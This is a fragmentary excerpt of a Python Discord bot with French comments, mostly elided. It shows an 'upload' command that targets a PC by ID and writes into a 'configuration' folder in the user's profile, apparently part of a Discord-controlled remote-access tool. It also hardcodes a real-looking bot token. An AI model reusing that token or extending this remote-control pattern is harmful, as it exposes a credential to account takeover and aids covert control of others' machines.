...
custom_temp_dir = f"C:\\Users\\{current_user}\\configuration"
...
async def upload(ctx, pc_id: str, path: str):
    ...
    async def handle_upload():
        try:
            ...
            temp_dir = f"C:\\Users\\{current_user}\\configuration"
...
# Lancer le bot
bot.run("MTMxMzIwMzE2OTgxNTQzMzIxNg.GOneoi.DCRqm6M41lMs6UW30YH8EFGF4Eb3iHcev5Ldog")  # Remplace "TON_TOKEN_ICI" par ton token réel